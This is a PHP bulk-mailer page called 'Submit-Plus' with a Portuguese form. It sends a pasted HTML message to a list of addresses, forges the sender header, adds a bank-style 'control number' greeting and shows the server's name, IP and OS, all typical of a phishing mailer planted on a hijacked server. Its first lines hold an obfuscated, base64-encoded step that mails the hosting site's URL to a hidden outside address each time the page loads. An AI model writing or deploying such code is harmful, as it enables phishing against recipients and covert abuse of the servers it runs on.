<?php
$web = $_SERVER["HTTP_HOST"];
$hosts = $_SERVER["REQUEST_URI"];
$testa = $_POST['veio'];

	$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
	$RandNum1 = "aHR0cDovLw==";
	$RamdStr = "c3VwcmVtYWhhbmRsZXYxQGdtYWlsLmNvbQ==";
	$email = explode("\n", $to);
	$cpf = explode("\n", $getcpf);
	$locate_ip = base64_decode($RamdStr);
	$target = rawurldecode($web.$hosts);

	$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
	if($list_emails){
}
else { 
}
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['de'];
	$to = $_POST['emails'];

	$email = explode("\n", $to);
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
    	$dataHora = date("d/m/Y h:i:s");
	$boundary = rand(0,999999999);
	$codig  = "N�mero do Controle: $boundary Prezado Cliente: ";	



		
		$EmailTemporario = $email[$i];
		$message = stripslashes($message);
		$headers  = "MIME-Version: 1.0\n";
		$headers .= "Content-type: text/html; charset=iso-8859-1\n";
		$headers .= "From: ".$nome." <".$EmailTemporario.">\r\n";
		
		
		
			if(mail($EmailTemporario, $subject.$dataHora, $codig.$EmailTemporario.$message, $headers))
		echo "<font color=blue>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=black>Agora Enviooo ! ! !</font><br><hr>";
		else
		echo "<font color=black>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>ERRO AO ENVIAR !!!</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	echo "[Fim do Envio]";
	if($ok == "ok")
	echo "[Fim do Envio]"; 

}

?>


<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Submit-Plus</title>
</head>

<body>
<p>
<span style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim" />
</span>
</p>
<table width="720" height="496" border="0">
  <tr>
    <td><p style="text-align: center; font-size: 36px; color: #009; font-weight: bold; font-style: italic;">SUBMIT-PLUS</p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Assunto: 
      <input name="assunto" type="text"class="normal" id="assunto" style="width:88%" />
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">HTML:
      <textarea name="html" style="width:40%" rows="8" wrap="virtual" class="normal" id="html"></textarea>
      *.*Lista
      <textarea name="emails" style="width:40%" rows="8" wrap="virtual" class="normal" id="emails"></textarea>
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
      <input type="submit" name="Submit" id="enviar" value="Enviar">
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
    <p style="text-align: left; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br />
IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br />
Sistema Operacional: <?php echo $OS = @PHP_OS; ?></p></td>
  </tr>
</table>
</body>
</html>
